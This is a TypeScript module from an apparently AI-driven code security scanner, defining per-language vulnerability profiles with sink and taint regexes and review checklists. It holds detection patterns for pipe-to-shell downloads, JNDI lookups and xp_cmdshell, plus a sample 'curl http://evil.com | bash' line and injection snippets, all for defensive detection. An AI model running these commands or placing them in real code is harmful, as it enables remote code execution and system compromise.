// ─────────────────────────────────────────────────────────────────────────────
// LANGUAGE-AWARE VULNERABILITY PROFILES v1
//
// The existing rule engine and prompts are heavily JS/TS-centric.
// This module injects language-specific vulnerability knowledge into:
//   • AI prompts (FAST_PROMPT + consensus roles)
//   • Adaptive routing (e.g. Python pickle = force adversarial-full)
//   • Hallucination firewall (language-specific sinks/sources)
//   • False-positive minimizer (language-specific safe patterns)
//
// Why this matters:
//   • Python: pickle.loads(), eval(), SSTI (Jinja2/Mako), subprocess shell=True,
//             yaml.load() (not safe_load), marshal.loads(), exec()
//   • PHP:    unserialize(), include()/require() with user input, system(),
//             preg_replace with /e modifier, extract($_GET), variable variables
//   • Java:   ObjectInputStream.readObject(), XXE (DocumentBuilder), JNDI lookup,
//             Runtime.exec(), reflection injection, Spring Expression injection
//   • Go:     goroutine race conditions, sql.Query with fmt.Sprintf, os/exec with
//             user input, path.Join traversal, template/html misuse
//   • Ruby:   eval/instance_eval, send() with user input, YAML.load, system(),
//             Open3.popen3, constantize (Rails gadget)
//   • C#:     BinaryFormatter, XmlSerializer, Process.Start, SqlCommand injection,
//             Regex ReDoS, unsafe code blocks, Assembly.Load
//   • Bash:   command injection via unquoted variables, eval, source with user input
//   • SQL:    stacked queries, time-based blind injection, second-order injection
// ─────────────────────────────────────────────────────────────────────────────

export type LanguageId =
  | 'javascript' | 'typescript'
  | 'python' | 'php' | 'java' | 'go'
  | 'ruby' | 'csharp' | 'cpp' | 'rust'
  | 'swift' | 'kotlin' | 'sql' | 'bash'
  | 'unknown';

export interface LanguageProfile {
  id:               LanguageId;
  label:            string;
  // Regex patterns for critical sinks — used by adaptive router to force tier upgrade
  criticalSinks:    RegExp[];
  // Regex patterns for known-safe constructs in this language (FP suppressors)
  safeSinks:        RegExp[];
  // Source patterns specific to this language (for taint analysis hint)
  taintSources:     RegExp[];
  // Plain-English list of vuln classes to emphasize in AI prompts
  vulnClasses:      string[];
  // Text block injected into the AI system prompt after the base prompt
  promptSupplement: string;
  // Routing override: if any criticalSinks match, force this minimum tier
  minimumTier?: 'single-reviewer' | 'triple-consensus' | 'adversarial-full';
}

// ─── Profile definitions ──────────────────────────────────────────────────────

const PYTHON_PROFILE: LanguageProfile = {
  id: 'python',
  label: 'Python',
  criticalSinks: [
    /pickle\.loads?\s*\(/,
    /marshal\.loads?\s*\(/,
    /yaml\.load\s*\([^,)]*\)/,       // yaml.load without Loader=yaml.SafeLoader
    /eval\s*\(/,
    /exec\s*\(/,
    /subprocess\.\w+\s*\([^)]*shell\s*=\s*True/,
    /os\.system\s*\(/,
    /os\.popen\s*\(/,
    /importlib\.import_module\s*\([^'"]/,
    /jinja2\.Template\s*\([^'"]/,    // SSTI: Template(user_input).render()
    /mako\.template\.Template\s*\([^'"]/,
  ],
  safeSinks: [
    /yaml\.safe_load\s*\(/,
    /json\.loads?\s*\(/,
    /ast\.literal_eval\s*\(/,        // safe subset of eval
    /subprocess\.\w+\s*\([^)]*shell\s*=\s*False/,
  ],
  taintSources: [
    /request\.(?:args|form|json|data|files|values|get_json)/,
    /flask\.request\./,
    /django\.request\./,
    /input\s*\(/,
    /sys\.argv/,
    /os\.environ/,
  ],
  vulnClasses: [
    'Python pickle/marshal deserialization (pickle.loads on untrusted data = arbitrary RCE)',
    'YAML deserialization (yaml.load without Loader=yaml.SafeLoader allows arbitrary object construction)',
    'Server-Side Template Injection (Jinja2/Mako Template(user_input).render() = SSTI/RCE)',
    'subprocess with shell=True + user input (shell injection)',
    'Python eval()/exec() on user-controlled strings',
    'Path traversal via os.path.join with user input',
    'SQL injection via %-formatting or f-strings in cursor.execute()',
    'Mass assignment via **request.json to model constructors',
    'Django/Flask CSRF bypass on state-changing endpoints',
    'Insecure deserialization via importlib.import_module with user input',
  ],
  promptSupplement: `
PYTHON-SPECIFIC VULNERABILITY CHECKLIST (apply in addition to general rules):
- pickle.loads(data): CRITICAL — any call with non-literal data = arbitrary RCE. No mitigation exists.
- yaml.load(data): HIGH — without Loader=yaml.SafeLoader, arbitrary Python objects can be constructed.
- eval()/exec(): HIGH — if any part of the argument is user-controlled, even indirectly.
- subprocess with shell=True: HIGH — if any part of the command string is user-controlled.
- Jinja2 Template(user_input).render(): HIGH — SSTI leading to RCE.
- cursor.execute(f"... {user_input}"): HIGH — SQL injection via f-string or % formatting.
- os.path.join('/base', user_input): MEDIUM — can escape base if user_input starts with /.
- **request.json passed to ORM: HIGH — mass assignment, may overwrite protected fields.
- json.loads is SAFE. ast.literal_eval is SAFE for literals. yaml.safe_load is SAFE.
- subprocess(['cmd', arg], shell=False) is SAFE for command injection (not path traversal).
`,
  minimumTier: 'single-reviewer',
};

const PHP_PROFILE: LanguageProfile = {
  id: 'php',
  label: 'PHP',
  criticalSinks: [
    /unserialize\s*\(/,
    /eval\s*\(/,
    /include\s*\(\s*\$(?!__)/,      // include with variable (not __DIR__ etc.)
    /require\s*\(\s*\$(?!__)/,
    /include_once\s*\(\s*\$(?!__)/,
    /require_once\s*\(\s*\$(?!__)/,
    /preg_replace\s*\(.*\/e['"]/,   // preg_replace /e modifier = code exec
    /system\s*\(/,
    /passthru\s*\(/,
    /shell_exec\s*\(/,
    /`.*\$_(?:GET|POST|REQUEST|COOKIE)/,  // backtick shell exec
    /extract\s*\(\s*\$_(?:GET|POST|REQUEST)/,   // variable injection
  ],
  safeSinks: [
    /htmlspecialchars\s*\(/,
    /htmlentities\s*\(/,
    /intval\s*\(/,
    /PDO.*prepare\s*\(/,
    /mysqli_real_escape_string\s*\(/,
  ],
  taintSources: [
    /\$_GET\s*\[/,
    /\$_POST\s*\[/,
    /\$_REQUEST\s*\[/,
    /\$_COOKIE\s*\[/,
    /\$_FILES\s*\[/,
    /\$_SERVER\s*\[['"]HTTP_/,
  ],
  vulnClasses: [
    'PHP unserialize() with user-controlled data (PHP object injection → RCE via gadget chains)',
    'Local/Remote File Inclusion via include/require with variable paths',
    'preg_replace /e modifier (executes replacement as PHP code — deprecated but deadly)',
    'PHP eval() / assert() with user input',
    'Command injection via system/exec/shell_exec/backtick with $_GET/$_POST',
    'extract($_GET) — injects arbitrary variables into scope',
    'SQL injection via string concatenation with $_GET/$_POST into mysql_query',
    'Type juggling: "0e123" == "0e456" → password hash bypass via loose comparison',
    'SSRF via file_get_contents/curl with user-controlled URL',
    'XXE via simplexml_load_string without LIBXML_NOENT protection',
  ],
  promptSupplement: `
PHP-SPECIFIC VULNERABILITY CHECKLIST (apply in addition to general rules):
- unserialize($_GET['data']): CRITICAL — PHP object injection. Even with class restrictions, gadget chains exist.
- include/require with variable: HIGH — Local File Inclusion (LFI). Null byte bypass possible pre-PHP 5.3.
- preg_replace('/pattern/e', $_POST['x'], $str): CRITICAL — /e executes replacement as PHP. Removed in PHP 7.
- extract($_GET): HIGH — injects arbitrary variables. Can overwrite $isAdmin, $username, etc.
- == vs ===: CRITICAL for authentication. "0e..." hashes are numerically 0 in PHP.
- system($cmd) where $cmd contains user input: CRITICAL — command injection.
- $_GET/$_POST directly in SQL without prepared statements: CRITICAL — SQLi.
- PDO->prepare() with bound params: SAFE. mysql_real_escape_string: generally safe but not for all contexts.
- htmlspecialchars($val, ENT_QUOTES): SAFE for HTML output.
`,
  minimumTier: 'triple-consensus',
};

const JAVA_PROFILE: LanguageProfile = {
  id: 'java',
  label: 'Java',
  criticalSinks: [
    /ObjectInputStream\s*\(/,
    /readObject\s*\(\s*\)/,
    /Runtime\.getRuntime\(\)\.exec\s*\(/,
    /ProcessBuilder\s*\(/,
    /DocumentBuilderFactory\.newInstance/,
    /SAXParserFactory\.newInstance/,
    /new InitialContext\(\)\.lookup/,   // JNDI injection
    /jndi:ldap:|jndi:rmi:/i,
    /ScriptEngineManager\s*\(\)/,       // JS engine = code exec
    /\.createQuery\s*\([^?].*\+/,       // JPQL injection
    /Class\.forName\s*\([^'"]/,
  ],
  safeSinks: [
    /PreparedStatement/,
    /setParameter\s*\(/,
    /TypedQuery/,
    /\.createQuery\s*\([^)]*,\s*\w+\.class/,
  ],
  taintSources: [
    /request\.getParameter\s*\(/,
    /request\.getHeader\s*\(/,
    /request\.getBody\s*\(/,
    /@RequestParam|@PathVariable|@RequestBody/,
    /System\.getenv\s*\(/,
    /HttpServletRequest/,
  ],
  vulnClasses: [
    'Java deserialization (ObjectInputStream.readObject on untrusted data = RCE via gadget chains)',
    'XXE (DocumentBuilderFactory without FEATURE_SECURE_PROCESSING = XML external entity injection)',
    'JNDI injection (InitialContext.lookup with user input = Log4Shell pattern → RCE)',
    'Runtime.exec() / ProcessBuilder with user input = command injection',
    'JPQL/HQL injection via string concatenation in createQuery()',
    'Spring Expression Language (SpEL) injection via @Value or EvaluationContext',
    'Path traversal via File(basePath + userInput)',
    'Insecure random via java.util.Random (not SecureRandom) for security tokens',
    'Class.forName() reflection injection with user-controlled class name',
    'Server-Side Request Forgery via URLConnection/HttpURLConnection with user URL',
  ],
  promptSupplement: `
JAVA-SPECIFIC VULNERABILITY CHECKLIST (apply in addition to general rules):
- ObjectInputStream.readObject(): CRITICAL — Java deserialization gadget chains (Apache Commons, Spring, etc.) = RCE.
- DocumentBuilderFactory without setFeature("http://apache.org/xml/features/disallow-doctype-decl", true): HIGH — XXE.
- InitialContext().lookup(userInput): CRITICAL — JNDI injection (Log4Shell pattern). Can trigger RCE via LDAP/RMI.
- Runtime.getRuntime().exec(cmd) where cmd includes user input: CRITICAL — command injection.
- createQuery("SELECT * FROM User WHERE name = '" + input + "'"): HIGH — JPQL injection.
- PreparedStatement with setString/setInt bindings: SAFE for SQLi.
- new File(baseDir + userInput) without canonical path check: HIGH — path traversal.
- java.util.Random for session/token generation: HIGH — predictable, use SecureRandom.
- SpEL via @Value("#{T(Runtime).exec('" + input + "')}"): CRITICAL — SpEL injection.
`,
  minimumTier: 'triple-consensus',
};

const GO_PROFILE: LanguageProfile = {
  id: 'go',
  label: 'Go',
  criticalSinks: [
    /exec\.Command\s*\([^"'][^)]*\)/,   // exec.Command with variable args
    /fmt\.Sprintf.*db\.\w+\s*\(/,        // SQL via fmt.Sprintf
    /db\.(?:Query|Exec)\s*\(.*fmt\.Sprintf/,
    /os\/exec/,
    /html\/template.*FuncMap.*JS/,       // custom JS template function = XSS
    /template\.HTML\s*\(/,              // trusted HTML type bypass
    /template\.JS\s*\(/,
  ],
  safeSinks: [
    /db\.(?:Query|Exec|QueryRow)\s*\([^)]*,\s*[^)]+\)/,  // parameterized
    /html\/template\./,    // html/template auto-escapes (text/template does NOT)
    /filepath\.Clean\s*\(/,
  ],
  taintSources: [
    /r\.(?:URL\.Query|FormValue|PostFormValue|Header\.Get)/,
    /mux\.Vars\s*\(/,
    /c\.Param\s*\(/,         // Gin/Echo params
    /c\.Query\s*\(/,
    /os\.Args/,
    /os\.Getenv\s*\(/,
  ],
  vulnClasses: [
    'SQL injection via fmt.Sprintf/string concat in db.Query/db.Exec (use ? placeholders)',
    'Command injection via exec.Command with user-controlled args as a single string',
    'XSS via text/template (does NOT auto-escape) vs html/template (safe)',
    'Path traversal via filepath.Join with user input (can escape base on some paths)',
    'SSRF via http.Get/http.Post with user-controlled URL',
    'Race conditions: shared map/slice writes across goroutines without mutex',
    'Integer overflow in 32-bit int conversions on 64-bit systems',
    'Goroutine leak: HTTP handler goroutines not properly terminated on context cancellation',
  ],
  promptSupplement: `
GO-SPECIFIC VULNERABILITY CHECKLIST (apply in addition to general rules):
- db.Query(fmt.Sprintf("... %s", userInput)): CRITICAL — SQL injection. Use db.Query("... ?", userInput).
- exec.Command("bash", "-c", userInput): CRITICAL — command injection. Pass args as separate strings.
- text/template: HIGH — does NOT auto-escape HTML. Use html/template for user-facing output.
- template.HTML(userInput): HIGH — bypasses html/template's auto-escaping.
- filepath.Join("/base/", userInput): MEDIUM — if userInput starts with .., can traverse.
- http.Get(userInput) with no domain validation: HIGH — SSRF.
- Concurrent map writes without sync.Mutex/sync.RWMutex: MEDIUM — data race → crash/corruption.
- Passing goroutines that outlive request context: MEDIUM — goroutine leak.
- db.Query("... ?", param): SAFE for SQLi. html/template auto-escaping: SAFE for XSS.
`,
  minimumTier: 'single-reviewer',
};

const RUBY_PROFILE: LanguageProfile = {
  id: 'ruby',
  label: 'Ruby',
  criticalSinks: [
    /eval\s*\(/,
    /instance_eval\s*\(/,
    /class_eval\s*\(/,
    /module_eval\s*\(/,
    /send\s*\(\s*params/,
    /constantize\s*\z/,        // Rails ActiveSupport: "String".constantize = arbitrary class
    /YAML\.load\s*\([^)]*\)/,
    /Marshal\.load\s*\(/,
    /`[^`]*#\{[^}]*params/,    // backtick shell with interpolation
    /system\s*\([^'"][^)]*\)/,
    /open\s*\(\s*['"]\|/,      // open("|cmd") = command execution
  ],
  safeSinks: [
    /YAML\.safe_load\s*\(/,
    /ERB::Util\.html_escape/,
    /ActiveRecord.*where\s*\([^)]*\?/,  // parameterized AR query
    /\.sanitize\s*\(/,
  ],
  taintSources: [
    /params\s*\[/,
    /request\.(?:body|params|headers)/,
    /ENV\s*\[/,
    /ARGV/,
  ],
  vulnClasses: [
    'Ruby eval/instance_eval/class_eval with user input = RCE',
    'Rails constantize on user input (params[:model].constantize) = arbitrary class instantiation → RCE',
    'YAML.load with user data (Psych YAML can deserialize arbitrary Ruby objects, use safe_load)',
    'Marshal.load with user data = arbitrary Ruby object deserialization → RCE',
    'send(params[:action]) = arbitrary method dispatch → privilege escalation',
    'Mass assignment via update(params) without strong parameters (Rails < 4)',
    'SQL injection via string interpolation in where("name = #{params[:name]}")',
    'Command injection via backtick/system/open with interpolated user data',
    'Path traversal via File.read(base_path + params[:file])',
    'Open redirect via redirect_to params[:return_url] without allowlist',
  ],
  promptSupplement: `
RUBY-SPECIFIC VULNERABILITY CHECKLIST (apply in addition to general rules):
- eval(params[:code]): CRITICAL — arbitrary Ruby code execution.
- params[:model].constantize: CRITICAL — loads arbitrary class, often chained to .new(params) for RCE.
- YAML.load(user_data): HIGH — deserializes arbitrary Ruby objects (gadget chains exist). Use YAML.safe_load.
- Marshal.load(user_data): CRITICAL — arbitrary deserialization = RCE.
- send(params[:method]): HIGH — arbitrary method call including system(), eval() etc.
- User.where("name = '#{params[:name]}'): HIGH — SQLi. Use .where(name: params[:name]) or .where("name = ?", params[:name]).
- update_attributes(params): HIGH (pre-Rails 4) — mass assignment. Use strong params permit.
- redirect_to params[:url]: HIGH — open redirect. Validate against allowlist.
- YAML.safe_load: SAFE. Parameterized ActiveRecord queries: SAFE.
`,
  minimumTier: 'single-reviewer',
};

const CSHARP_PROFILE: LanguageProfile = {
  id: 'csharp',
  label: 'C#',
  criticalSinks: [
    /BinaryFormatter\s*\(/,
    /NetDataContractSerializer\s*\(/,
    /LosFormatter\s*\(/,
    /ObjectStateFormatter\s*\(/,
    /SoapFormatter\s*\(/,
    /Process\.Start\s*\(/,
    /new SqlCommand\s*\([^@][^)]*\+/,   // SqlCommand with concat (not parameterized)
    /Assembly\.Load\s*\([^'"]/,
    /Activator\.CreateInstance\s*\([^'"]/,
    /XmlDocument\s*\(\)/,               // XXE risk without resolver disable
    /new Regex\s*\([^)]*\{[^}]*,\s*\d{3,}/,  // ReDoS: nested quantifiers + large input
  ],
  safeSinks: [
    /SqlCommand\s*\(.*@\w+/,   // parameterized with @ params
    /XmlReaderSettings\s*\{[^}]*DtdProcessing\s*=\s*DtdProcessing\.Prohibit/,
    /XmlResolver\s*=\s*null/,
    /AntiXssEncoder|HttpUtility\.HtmlEncode/,
  ],
  taintSources: [
    /Request\.(?:QueryString|Form|Params|Headers)/,
    /HttpContext\.Request\./,
    /\[FromBody\]|\[FromQuery\]|\[FromRoute\]/,
    /Environment\.GetEnvironmentVariable/,
    /Console\.ReadLine\s*\(\)/,
  ],
  vulnClasses: [
    'BinaryFormatter/NetDataContractSerializer deserialization (banned in .NET 5+, still deadly in legacy)',
    '.NET XML deserialization via XmlSerializer with untrusted types',
    'XXE via XmlDocument without XmlResolver=null and DtdProcessing.Prohibit',
    'SQL injection via string concatenation in SqlCommand (use @ parameters)',
    'Command injection via Process.Start with user input',
    'CSRF on state-changing MVC actions without [ValidateAntiForgeryToken]',
    'Open redirect via Response.Redirect(Request["returnUrl"]) without validation',
    'Path traversal via Path.Combine(basePath, userInput) — absolute path injection on Windows',
    'ReDoS via user-controlled Regex pattern with catastrophic backtracking',
    'Assembly.Load/Activator.CreateInstance with user-controlled type name',
  ],
  promptSupplement: `
C#-SPECIFIC VULNERABILITY CHECKLIST (apply in addition to general rules):
- BinaryFormatter.Deserialize(): CRITICAL — arbitrary .NET deserialization = RCE. Banned in .NET 5+.
- new SqlCommand("SELECT * FROM users WHERE id = " + userId): HIGH — SQLi. Use cmd.Parameters.AddWithValue("@id", userId).
- XmlDocument without xmlDoc.XmlResolver = null: HIGH — XXE. Also set DtdProcessing = DtdProcessing.Prohibit.
- Process.Start("cmd.exe", "/c " + userInput): CRITICAL — command injection.
- Path.Combine(@"C:\\base", userInput): HIGH — on Windows, Path.Combine(@"C:\\base", @"C:\\windows\\win.ini") returns the second absolute path.
- [FromBody] model with no [BindRequired] or validation: MEDIUM — may allow over-posting.
- Response.Redirect(Request.QueryString["url"]): HIGH — open redirect.
- new Regex(userPattern): HIGH — user-controlled regex = ReDoS if not sandboxed.
- SqlCommand with @parameters: SAFE. HtmlEncode before output: SAFE.
`,
  minimumTier: 'single-reviewer',
};

const BASH_PROFILE: LanguageProfile = {
  id: 'bash',
  label: 'Bash/Shell',
  criticalSinks: [
    /eval\s+["']?\$\{?\w+/,       // eval with variable
    /eval\s+\`/,                   // eval with backtick
    /\$\(.*\$\w+.*\)/,            // command substitution with variable
    /source\s+.*\$\w+/,           // source with variable path
    /\.\s+.*\$\w+/,               // . (dot) source with variable
    /curl\s+.*\$\w+.*\|\s*(?:bash|sh)/,  // pipe to shell from user URL
    /wget\s+.*\$\w+.*-O\s*-.*\|\s*(?:bash|sh)/,
  ],
  safeSinks: [
    /printf '%s'/,                 // safe printf with format string
    /\[\[\s+.*==/,                 // [[ ]] double brackets (safer)
  ],
  taintSources: [
    /\$1|\$2|\$@|\$\*|\$\{[1-9]/,  // positional parameters
    /read\s+\w+/,                   // read input
    /curl.*\|\|/,                   // external data
    /\$\(curl|wget\)/,
  ],
  vulnClasses: [
    'Command injection via unquoted variables in shell commands (always quote: "$var" not $var)',
    'eval with user-supplied data — treats string as shell command',
    'Pipe-to-shell pattern: curl/wget URL | bash — arbitrary code from server',
    'Source/dot with variable path — executes arbitrary file as shell script',
    'Path traversal via unvalidated file paths in cp/mv/rm/cat',
    'Credential leakage in process arguments (visible in /proc/[pid]/cmdline)',
    'Insecure temp file creation (use mktemp, not predictable /tmp/script.$$)',
    'TOCTOU race in [ -f file ] check then use',
    'Privilege escalation via SUID script (shell scripts cannot be safely SUID)',
  ],
  promptSupplement: [
    'BASH-SPECIFIC VULNERABILITY CHECKLIST (apply in addition to general rules):',
    '- eval "$var": CRITICAL — if $var contains user input, arbitrary command execution.',
    '- command $var (unquoted): HIGH — word splitting. Use command "$var" (quoted) or arrays.',
    '- curl http://evil.com | bash: CRITICAL — executes arbitrary code from server.',
    '- for f in $(find ...): MEDIUM — filename injection. Use while IFS= read -r f; done < <(find ...).',
    '- rm -rf "$BASE_DIR/$user_input": HIGH — path traversal if user_input = /../../../.',
    '- Temp files in /tmp with predictable names: MEDIUM — symlink attack. Use mktemp.',
    '- Passing secrets as env vars to subprocesses: LOW — visible in /proc but better than cmdline args.',
    '- Always check: are variables double-quoted? Are arrays used for multi-word args?',
  ].join('\n'),
  minimumTier: 'single-reviewer',
};

const SQL_PROFILE: LanguageProfile = {
  id: 'sql',
  label: 'SQL',
  criticalSinks: [
    /EXEC\s*\(\s*@/i,
    /EXECUTE\s+sp_executesql/i,
    /xp_cmdshell/i,
    /OPENROWSET\s*\(/i,
    /LOAD_FILE\s*\(/i,
    /INTO\s+OUTFILE/i,
    /SELECT\s+.*INTO\s+(?!@)\w/i,
  ],
  safeSinks: [],
  taintSources: [],
  vulnClasses: [
    'Stacked query injection (semicolon-separated statements)',
    'Second-order SQL injection (stored then re-executed without re-sanitization)',
    'EXEC()/sp_executesql with dynamic SQL from user input',
    'xp_cmdshell abuse (if enabled, SQL Server command execution)',
    'LOAD DATA INFILE / LOAD_FILE — reads local server files',
    'SELECT INTO OUTFILE — writes to server filesystem',
    'Blind injection via time-based (SLEEP/WAITFOR) or boolean payloads',
    'Error-based extraction via EXTRACTVALUE/UPDATEXML in MySQL',
  ],
  promptSupplement: `
SQL-SPECIFIC VULNERABILITY CHECKLIST:
- EXEC(@dynamicSql): HIGH — if @dynamicSql includes user input, SQLi.
- xp_cmdshell: CRITICAL — if enabled, executes OS commands with SQL Server process privileges.
- LOAD_FILE(userInput): HIGH — reads arbitrary files from server filesystem.
- SELECT ... INTO OUTFILE userInput: HIGH — writes query results to arbitrary server path.
- Second-order injection: look for data being STORED then later interpolated into another query.
- Stacked queries (;): HIGH — if app layer allows, attacker can DROP TABLE / INSERT admin user.
- sp_executesql with properly typed parameters (@param nvarchar): SAFE.
`,
  minimumTier: 'single-reviewer',
};

// ─── Profile registry ─────────────────────────────────────────────────────────

const PROFILES: Record<LanguageId, LanguageProfile> = {
  python:     PYTHON_PROFILE,
  php:        PHP_PROFILE,
  java:       JAVA_PROFILE,
  go:         GO_PROFILE,
  ruby:       RUBY_PROFILE,
  csharp:     CSHARP_PROFILE,
  bash:       BASH_PROFILE,
  sql:        SQL_PROFILE,
  // JS/TS are already well-covered by existing rules — minimal supplement
  javascript: {
    id: 'javascript', label: 'JavaScript',
    criticalSinks: [
      /eval\s*\(/,
      /new Function\s*\(/,
      /vm\.run(?:InNewContext|InThisContext)/,
    ],
    safeSinks: [],
    taintSources: [/req\.(body|query|params|headers)/, /process\.argv/],
    vulnClasses: [],
    promptSupplement: '',
    minimumTier: 'single-reviewer',
  },
  typescript: {
    id: 'typescript', label: 'TypeScript',
    criticalSinks: [
      /eval\s*\(/,
      /new Function\s*\(/,
    ],
    safeSinks: [],
    taintSources: [/req\.(body|query|params|headers)/],
    vulnClasses: [],
    promptSupplement: '',
    minimumTier: 'single-reviewer',
  },
  // Languages without specific profiles fall through to JS defaults
  rust:    { id: 'rust',   label: 'Rust',   criticalSinks: [/unsafe\s*\{/], safeSinks: [], taintSources: [], vulnClasses: ['unsafe block with raw pointer dereference', 'Command::new with user input', 'Untrusted deserialization via serde'], promptSupplement: 'Focus on: unsafe blocks, Command::new with user input, serde deserialization without validation, integer overflow (unchecked arithmetic), path traversal via PathBuf::join.', minimumTier: 'single-reviewer' },
  cpp:     { id: 'cpp',    label: 'C++',    criticalSinks: [/system\s*\(/, /strcpy\s*\(/, /sprintf\s*\(/, /gets\s*\(/], safeSinks: [/strncpy\s*\(/, /snprintf\s*\(/], taintSources: [/argv\[/, /cin\s*>>/], vulnClasses: ['Buffer overflow (strcpy/sprintf/gets without bounds)', 'Format string vulnerability (printf(userInput))', 'Use-after-free', 'Integer overflow leading to heap underflow'], promptSupplement: 'Focus on: buffer overflows (strcpy/gets/sprintf), format string bugs (printf(userInput)), integer overflow in size calculations, use-after-free, command injection via system().', minimumTier: 'single-reviewer' },
  swift:   { id: 'swift',  label: 'Swift',  criticalSinks: [], safeSinks: [], taintSources: [], vulnClasses: [], promptSupplement: '', minimumTier: 'single-reviewer' },
  kotlin:  { id: 'kotlin', label: 'Kotlin', criticalSinks: [/Runtime\.exec\s*\(/, /ProcessBuilder\s*\(/], safeSinks: [/PreparedStatement/, /setParameter\s*\(/], taintSources: [/@RequestParam|@PathVariable|@RequestBody/], vulnClasses: ['Java deserialization', 'JDBC SQL injection', 'Command injection via ProcessBuilder'], promptSupplement: 'Kotlin shares the JVM — apply Java deserialization, XXE, JNDI injection, and JDBC SQLi rules. Additionally check: coroutine cancellation handling, runBlocking in production code (can block threads).', minimumTier: 'single-reviewer' },
  unknown: { id: 'unknown', label: 'Unknown', criticalSinks: [], safeSinks: [], taintSources: [], vulnClasses: [], promptSupplement: '' },
};

// ─── Language detection ───────────────────────────────────────────────────────

/**
 * Auto-detects language from code content when langHint is 'auto-detect' or unknown.
 * Returns highest-confidence match or 'unknown'.
 */
export function detectLanguage(code: string, langHint: string): LanguageId {
  const normalized = langHint.toLowerCase().replace(/[^a-z#+-]/g, '');

  // Direct hint mappings
  const hintMap: Record<string, LanguageId> = {
    javascript: 'javascript', js: 'javascript',
    typescript: 'typescript', ts: 'typescript',
    python: 'python', py: 'python',
    php: 'php',
    java: 'java',
    go: 'go', golang: 'go',
    ruby: 'ruby', rb: 'ruby',
    csharp: 'csharp', cs: 'csharp', 'c#': 'csharp',
    cpp: 'cpp', 'c++': 'cpp',
    rust: 'rust', rs: 'rust',
    swift: 'swift',
    kotlin: 'kotlin', kt: 'kotlin',
    sql: 'sql',
    bash: 'bash', sh: 'bash', shell: 'bash',
  };
  if (normalized in hintMap) return hintMap[normalized];

  // Content-based detection (rough heuristics)
  const scores: Partial<Record<LanguageId, number>> = {};
  function add(lang: LanguageId, n: number) { scores[lang] = (scores[lang] ?? 0) + n; }

  if (/^\s*import\s+\w+\s+from\s+['"]/m.test(code) || /const\s+\w+\s*=\s*require\s*\(/.test(code)) add('javascript', 10);
  if (/:\s*(?:string|number|boolean|void|interface|type\s+\w+\s*=)\b/.test(code) || /async\s+\w+\s*\([^)]*:\s*\w+/.test(code)) add('typescript', 12);
  if (/def\s+\w+\s*\(|import\s+\w+\n|from\s+\w+\s+import|print\s*\(/.test(code)) add('python', 10);
  if (/\$_(?:GET|POST|REQUEST|COOKIE)|<\?php/.test(code)) add('php', 15);
  if (/public\s+(?:static\s+)?(?:void\s+main|class\s+\w+)|import\s+java\./.test(code)) add('java', 12);
  if (/^func\s+\w+\s*\(|^package\s+\w+/m.test(code)) add('go', 12);
  if (/require\s+['"]\w+['"]|def\s+\w+\s*$|\.each\s+do\s+\|/.test(code)) add('ruby', 10);
  if (/namespace\s+\w+;|using\s+System;|public\s+class.*:\s*\w+/.test(code)) add('csharp', 12);
  if (/#include\s*<\w+>|std::|nullptr|cout\s*<</.test(code)) add('cpp', 12);
  if (/fn\s+\w+\s*\(.*\)\s*(?:->|{)|let\s+mut\s+|impl\s+\w+/.test(code)) add('rust', 12);
  if (/^\s*SELECT|INSERT INTO|UPDATE.*SET|DELETE FROM|CREATE TABLE/im.test(code)) add('sql', 15);
  if (/^#!\/(?:bin|usr)\/(?:env\s+)?(?:bash|sh)|^\s*echo\s+|^\s*if\s*\[/m.test(code)) add('bash', 12);

  const best = (Object.entries(scores) as [LanguageId, number][])
    .sort((a, b) => b[1] - a[1])[0];

  return best && best[1] >= 8 ? best[0] : 'unknown';
}

// ─── Public API ───────────────────────────────────────────────────────────────

export function getProfile(lang: LanguageId): LanguageProfile {
  return PROFILES[lang] ?? PROFILES.unknown;
}

/**
 * Returns the minimum routing tier required by this language profile,
 * considering code patterns. Used by the adaptive router to override
 * tier decisions.
 */
export function getLanguageRoutingOverride(
  lang: LanguageId,
  code: string,
): 'single-reviewer' | 'triple-consensus' | 'adversarial-full' | null {
  const profile = getProfile(lang);

  // Count critical sink hits
  const criticalHits = profile.criticalSinks.filter(p => p.test(code)).length;

  // Language-specific "always adversarial" patterns — these are RCE-class
  // sinks where even a single occurrence warrants the full pipeline.
  const ALWAYS_ADVERSARIAL: Partial<Record<LanguageId, RegExp[]>> = {
    python:  [/pickle\.loads?\s*\(/, /marshal\.loads?\s*\(/, /\beval\s*\(/, /\bexec\s*\(/, /yaml\.load\s*\([^,)]*\)/],
    php:     [/unserialize\s*\(/, /eval\s*\(/, /preg_replace\s*\(.*\/e['"]/],
    java:    [/ObjectInputStream/, /readObject\s*\(\s*\)/, /InitialContext\(\)\.lookup/],
    ruby:    [/Marshal\.load\s*\(/, /YAML\.load\s*\([^)]*\)/, /\bsend\s*\(\s*params/, /constantize\s*\z/],
    csharp:  [/BinaryFormatter/, /NetDataContractSerializer/, /SoapFormatter/],
  };

  const alwaysPats = ALWAYS_ADVERSARIAL[lang] ?? [];
  if (alwaysPats.some(p => p.test(code))) {
    return 'adversarial-full';
  }

  if (criticalHits >= 3) {
    return 'adversarial-full';
  }
  if (criticalHits >= 1) {
    return profile.minimumTier ?? 'single-reviewer';
  }
  return null;
}

/**
 * Builds the language-specific supplement text to inject into AI prompts.
 * Returns empty string for JS/TS (already covered by base prompt).
 */
export function buildLanguagePromptSupplement(lang: LanguageId, code: string): string {
  const profile = getProfile(lang);
  if (!profile.promptSupplement) return '';

  const vulnList = profile.vulnClasses.length > 0
    ? `\nKEY VULN CLASSES FOR ${profile.label.toUpperCase()} (prioritize these):\n` +
      profile.vulnClasses.map((v, i) => `  ${i + 1}. ${v}`).join('\n')
    : '';

  return `\n${profile.promptSupplement}${vulnList}\n`;
}

/**
 * Returns language-specific safe-sink patterns for FP suppression.
 * The hallucination firewall and FP minimizer can use these.
 */
export function getLanguageSafeSinks(lang: LanguageId): RegExp[] {
  return getProfile(lang).safeSinks;
}

/**
 * Returns language-specific taint sources for supplementing taint analysis.
 */
export function getLanguageTaintSources(lang: LanguageId): RegExp[] {
  return getProfile(lang).taintSources;
}
